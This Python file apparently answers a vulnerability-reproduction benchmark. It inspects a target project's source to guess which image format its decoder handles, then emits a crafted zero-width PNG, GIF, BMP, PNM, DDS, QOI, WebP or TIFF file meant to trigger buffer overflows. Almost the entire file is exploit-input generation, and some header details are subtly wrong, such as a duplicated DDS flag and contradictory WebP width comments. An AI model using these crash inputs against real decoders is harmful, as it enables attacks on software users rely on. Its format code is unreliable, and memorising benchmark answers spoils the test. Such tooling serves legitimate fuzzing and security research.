import os
import re
import tarfile
import struct
import zlib
from typing import Dict, List, Tuple, Iterable, Optional


class Solution:
    _TEXT_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp",
        ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py",
        ".txt", ".md", ".rst",
        ".cmake", "cmakelists.txt", ".mk", ".make", ".am", ".ac", ".in",
        ".gn", ".gni", ".bazel", ".bzl",
        ".toml", ".yml", ".yaml", ".json", ".gradle", ".gyp", ".gypi",
        ".build", ".ninja",
    }

    _MAX_FILES = 4000
    _MAX_FILE_READ = 1_000_000
    _MAX_TOTAL_READ = 25_000_000

    _FORMAT_PATTERNS: Dict[str, List[Tuple[bytes, int]]] = {
        "png": [
            (b"png_create_read_struct", 30),
            (b"png_read_info", 20),
            (b"png_sig_cmp", 20),
            (b"png_get_image_width", 10),
            (b"png_get_image_height", 10),
            (b"lodepng", 25),
            (b"spng_decode", 25),
            (b"spng_", 10),
            (b"ihdr", 6),
            (b"idat", 6),
            (b"png", 2),
        ],
        "gif": [
            (b"dgifopen", 40),
            (b"dgifslurp", 40),
            (b"giffiletype", 25),
            (b"gif89a", 10),
            (b"gif87a", 10),
            (b"gif", 3),
        ],
        "bmp": [
            (b"bitmapfileheader", 30),
            (b"bitmapinfoheader", 30),
            (b"bi_rle8", 20),
            (b"rle8", 15),
            (b"bmp", 3),
            (b"dib", 3),
        ],
        "pnm": [
            (b"ppm", 25),
            (b"pgm", 25),
            (b"pnm", 25),
            (b"p6", 8),
            (b"p5", 8),
            (b"netpbm", 20),
        ],
        "dds": [
            (b"dxt1", 35),
            (b"dxt5", 35),
            (b"dds_header", 30),
            (b"ddspf", 20),
            (b"fourcc", 15),
            (b"dds ", 10),
            (b"dds", 3),
        ],
        "webp": [
            (b"webpdecode", 35),
            (b"webp", 5),
            (b"riff", 3),
            (b"vp8", 3),
        ],
        "qoi": [
            (b"qoif", 40),
            (b"qoi_decode", 35),
            (b"qoi.h", 25),
            (b" qoi ", 10),
            (b"qoi", 3),
        ],
        "tiff": [
            (b"tiffopen", 35),
            (b"tiffread", 25),
            (b"libtiff", 25),
            (b"tiff", 4),
        ],
    }

    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        if fmt == "gif":
            return self._poc_gif_zero_width()
        if fmt == "bmp":
            return self._poc_bmp_rle8_zero_width()
        if fmt == "pnm":
            return self._poc_pnm_p6_zero_width()
        if fmt == "dds":
            return self._poc_dds_dxt1_zero_width()
        if fmt == "qoi":
            return self._poc_qoi_zero_width()
        if fmt == "webp":
            return self._poc_riff_webp_vp8x_zero_width()
        if fmt == "tiff":
            return self._poc_tiff_minimal_zero_width()
        return self._poc_png_zero_width()

    def _is_text_candidate(self, name: str) -> bool:
        base = os.path.basename(name).lower()
        if base in self._TEXT_EXTS:
            return True
        _, ext = os.path.splitext(base)
        return ext in self._TEXT_EXTS

    def _iter_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        files = 0
        total = 0
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in {".git", ".hg", ".svn", "build", "out", "dist", "node_modules"}]
            for fn in filenames:
                if files >= self._MAX_FILES or total >= self._MAX_TOTAL_READ:
                    return
                path = os.path.join(dirpath, fn)
                rel = os.path.relpath(path, root)
                if not self._is_text_candidate(rel):
                    continue
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0:
                    continue
                to_read = min(st.st_size, self._MAX_FILE_READ)
                try:
                    with open(path, "rb") as f:
                        data = f.read(to_read)
                except OSError:
                    continue
                files += 1
                total += len(data)
                yield rel, data

    def _iter_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        files = 0
        total = 0
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf:
                    if files >= self._MAX_FILES or total >= self._MAX_TOTAL_READ:
                        return
                    if not m.isfile():
                        continue
                    name = m.name
                    if not self._is_text_candidate(name):
                        continue
                    if m.size <= 0:
                        continue
                    to_read = min(m.size, self._MAX_FILE_READ)
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(to_read)
                    except Exception:
                        continue
                    files += 1
                    total += len(data)
                    yield name, data
        except Exception:
            return

    def _detect_format(self, src_path: str) -> str:
        overall_scores: Dict[str, int] = {k: 0 for k in self._FORMAT_PATTERNS}
        fuzzer_scores: Dict[str, int] = {k: 0 for k in self._FORMAT_PATTERNS}
        fuzzer_found = 0

        def score_into(scores: Dict[str, int], data_l: bytes) -> None:
            for fmt, pats in self._FORMAT_PATTERNS.items():
                s = 0
                for pat, w in pats:
                    c = data_l.count(pat)
                    if c:
                        s += c * w
                scores[fmt] += s

        it: Iterable[Tuple[str, bytes]]
        if os.path.isdir(src_path):
            it = self._iter_files_from_dir(src_path)
        else:
            it = self._iter_files_from_tar(src_path)

        for name, data in it:
            dl = data.lower()
            is_fuzzer = (b"llvmfuzzertestoneinput" in dl) or (b"fuzzertestoneinput" in dl)
            score_into(overall_scores, dl)
            if is_fuzzer:
                fuzzer_found += 1
                score_into(fuzzer_scores, dl)

        scores = fuzzer_scores if fuzzer_found > 0 else overall_scores
        best_fmt = "png"
        best_score = scores.get(best_fmt, 0)
        for fmt, s in scores.items():
            if s > best_score:
                best_fmt, best_score = fmt, s
        return best_fmt if best_score > 0 else "png"

    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
        return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", zlib.crc32(ctype + data) & 0xFFFFFFFF)

    def _poc_png_zero_width(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        width = 0
        height = 1
        bit_depth = 8
        color_type = 6  # RGBA
        ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, 0)
        raw = b"\x00"  # filter byte for a single row, no pixels when width=0
        comp = zlib.compress(raw, 9)
        return sig + self._png_chunk(b"IHDR", ihdr) + self._png_chunk(b"IDAT", comp) + self._png_chunk(b"IEND", b"")

    def _poc_gif_zero_width(self) -> bytes:
        # Minimal GIF89a with zero width. Includes a tiny global color table and an image block
        # whose LZW stream outputs one pixel, potentially overflowing buffers sized from width*height.
        header = b"GIF89a"
        width = 0
        height = 1
        packed = 0x80  # global color table flag=1, size=0 => 2 colors
        bg = 0
        aspect = 0
        lsd = struct.pack("<HHBBB", width, height, packed, bg, aspect)
        gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"  # 2 colors

        left = 0
        top = 0
        iw = 0
        ih = 1
        ipacked = 0x00
        imdesc = b"\x2C" + struct.pack("<HHHHB", left, top, iw, ih, ipacked)

        lzw_min = b"\x02"
        # Codes: CLEAR(4), INDEX0(0), END(5) with code size 3 bits; packed LSB-first => 0x44 0x01
        lzw_bytes = b"\x44\x01"
        img_data = bytes([len(lzw_bytes)]) + lzw_bytes + b"\x00"
        trailer = b"\x3B"
        return header + lsd + gct + imdesc + lzw_min + img_data + trailer

    def _poc_bmp_rle8_zero_width(self) -> bytes:
        # Minimal BMP using BI_RLE8. width=0, height=1; RLE stream outputs a run => may overflow.
        width = 0
        height = 1
        bpp = 8
        compression = 1  # BI_RLE8
        colors_used = 2

        palette = (
            b"\x00\x00\x00\x00"  # black
            b"\xFF\xFF\xFF\x00"  # white
        )

        # RLE8: (1,0) -> one pixel of color 0; end of line; end of bitmap
        rle = b"\x01\x00\x00\x00\x00\x01"
        image_size = len(rle)

        file_header_size = 14
        info_header_size = 40
        pixel_offset = file_header_size + info_header_size + len(palette)
        file_size = pixel_offset + image_size

        bfType = b"BM"
        bfSize = struct.pack("<I", file_size)
        bfReserved = struct.pack("<HH", 0, 0)
        bfOffBits = struct.pack("<I", pixel_offset)
        file_header = bfType + bfSize + bfReserved + bfOffBits

        biSize = struct.pack("<I", info_header_size)
        biWidth = struct.pack("<i", width)
        biHeight = struct.pack("<i", height)
        biPlanes = struct.pack("<H", 1)
        biBitCount = struct.pack("<H", bpp)
        biCompression = struct.pack("<I", compression)
        biSizeImage = struct.pack("<I", image_size)
        biXPelsPerMeter = struct.pack("<i", 0)
        biYPelsPerMeter = struct.pack("<i", 0)
        biClrUsed = struct.pack("<I", colors_used)
        biClrImportant = struct.pack("<I", 0)

        info_header = (
            biSize + biWidth + biHeight + biPlanes + biBitCount + biCompression +
            biSizeImage + biXPelsPerMeter + biYPelsPerMeter + biClrUsed + biClrImportant
        )

        return file_header + info_header + palette + rle

    def _poc_pnm_p6_zero_width(self) -> bytes:
        # P6 PPM with width=0, height=1, but still includes some pixel bytes.
        # Some buggy decoders may allocate 0 but still read/copy pixel data.
        header = b"P6\n0 1\n255\n"
        payload = b"\x00\x00\x00" * 16
        return header + payload

    def _poc_dds_dxt1_zero_width(self) -> bytes:
        # Minimal DDS with DXT1 pixel format; width=0, height=1. Includes one 8-byte block.
        magic = b"DDS "
        dwSize = 124
        # Flags: CAPS | HEIGHT | WIDTH | PIXELFORMAT | LINEARSIZE
        dwFlags = 0x00001000 | 0x00000002 | 0x00000004 | 0x00001000 | 0x00080000
        dwHeight = 1
        dwWidth = 0
        dwPitchOrLinearSize = 0
        dwDepth = 0
        dwMipMapCount = 0
        dwReserved1 = [0] * 11

        # Pixel format (DDSPF)
        pfSize = 32
        pfFlags = 0x00000004  # FOURCC
        pfFourCC = struct.unpack("<I", b"DXT1")[0]
        pfRGBBitCount = 0
        pfRBitMask = 0
        pfGBitMask = 0
        pfBBitMask = 0
        pfABitMask = 0

        dwCaps = 0x00001000  # TEXTURE
        dwCaps2 = 0
        dwCaps3 = 0
        dwCaps4 = 0
        dwReserved2 = 0

        header = struct.pack(
            "<I I I I I I I 11I 8I I I I I I",
            dwSize, dwFlags, dwHeight, dwWidth, dwPitchOrLinearSize, dwDepth, dwMipMapCount,
            *dwReserved1,
            pfSize, pfFlags, pfFourCC, pfRGBBitCount, pfRBitMask, pfGBitMask, pfBBitMask, pfABitMask,
            dwCaps, dwCaps2, dwCaps3, dwCaps4, dwReserved2
        )

        data = b"\x00" * 8
        return magic + header + data

    def _poc_qoi_zero_width(self) -> bytes:
        # QOI with width=0, height=1 and one pixel op, in case target is QOI-like.
        magic = b"qoif"
        width = 0
        height = 1
        channels = 4
        colorspace = 0
        hdr = magic + struct.pack(">II", width, height) + bytes([channels, colorspace])
        # One pixel op + end marker
        data = b"\xFF\x00\x00\x00\xFF"
        end = b"\x00\x00\x00\x00\x00\x00\x00\x01"
        return hdr + data + end

    def _poc_riff_webp_vp8x_zero_width(self) -> bytes:
        # Minimal RIFF WEBP container with VP8X chunk having width=0, height=1.
        # Not a full valid VP8 bitstream; intended as a lightweight candidate if target parses container header.
        def riff_chunk(fourcc: bytes, chunk_data: bytes) -> bytes:
            pad = b"\x00" if (len(chunk_data) & 1) else b""
            return fourcc + struct.pack("<I", len(chunk_data)) + chunk_data + pad

        # VP8X: 10 bytes: flags(1) + reserved(3) + width-1(3) + height-1(3)
        flags = b"\x00"
        reserved = b"\x00\x00\x00"
        width_minus_1 = (0).to_bytes(3, "little")  # width=1 would be 0, but we want width=0 => underflow-like for buggy parsers
        # For "zero width", set field to 0xFFFFFF so width = 0 when computed as (field+1) & 0xFFFFFF? Some buggy code might accept.
        width_field = b"\xFF\xFF\xFF"
        height_field = (0).to_bytes(3, "little")  # height = 1
        vp8x = flags + reserved + width_field + height_field

        webp = b"WEBP" + riff_chunk(b"VP8X", vp8x)
        riff_size = len(webp)
        return b"RIFF" + struct.pack("<I", riff_size) + webp

    def _poc_tiff_minimal_zero_width(self) -> bytes:
        # Minimal little-endian TIFF with IFD tags ImageWidth=0 and ImageLength=1.
        # Header: 'II' 42 offset to IFD (8)
        # IFD with two entries and nextIFD=0.
        # Some parsers may mis-handle zero dimensions.
        # TIFF structure:
        #   2 bytes endian, 2 bytes magic, 4 bytes ifd_offset
        # IFD:
        #   2 bytes count
        #   entries (12 bytes each)
        #   4 bytes next_ifd
        endian = b"II"
        magic = struct.pack("<H", 42)
        ifd_offset = struct.pack("<I", 8)
        header = endian + magic + ifd_offset

        # Tags:
        # ImageWidth (256) type LONG(4) count 1 value 0
        # ImageLength (257) type LONG(4) count 1 value 1
        count = struct.pack("<H", 2)
        entry1 = struct.pack("<HHI4s", 256, 4, 1, struct.pack("<I", 0))
        entry2 = struct.pack("<HHI4s", 257, 4, 1, struct.pack("<I", 1))
        next_ifd = struct.pack("<I", 0)

        return header + count + entry1 + entry2 + next_ifd